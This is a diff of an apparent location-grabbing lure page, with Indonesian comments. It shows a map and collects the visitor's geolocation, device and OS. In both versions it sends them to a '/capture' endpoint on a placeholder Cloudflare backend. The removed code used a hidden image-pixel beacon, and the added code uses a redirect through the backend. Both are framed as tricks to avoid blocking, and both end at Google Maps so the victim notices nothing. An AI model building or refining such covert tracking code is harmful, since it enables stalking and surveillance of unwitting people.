@@ -83,10 +83,8 @@
     </div>
 
 <script>
-    // =====================================================================
-    // GANTI TULISAN DI BAWAH INI PAKAI LINK CLOUDFLARE YANG BARU MUNCUL
-    // =====================================================================
-    const BACKEND_URL = "LINK_CLOUDFLARE_BARU"; 
+    // GANTI PAKAI LINK CLOUDFLARE JS YANG AKTIF
+    const BACKEND_URL = "LINK_CLOUDFLARE_JS"; 
 
     var map = L.map('map', {zoomControl: false}).setView([3.0297, 101.4497], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
@@ -134,13 +132,9 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // === TRIK IMAGE PIXEL (ANTI BLOKIR CORS) ===
-                    var img = new Image();
-                    img.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
-
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
-                    }, 1500);
+                    // === TRIK REDIRECT URL (ANTI BLOKIR) ===
+                    // Browser HP bakal dialihin sebentar ke Cloudflare, lalu Cloudflare balikin ke Google Maps
+                    window.location.href = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
                 },
                 (error) => {
                     window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
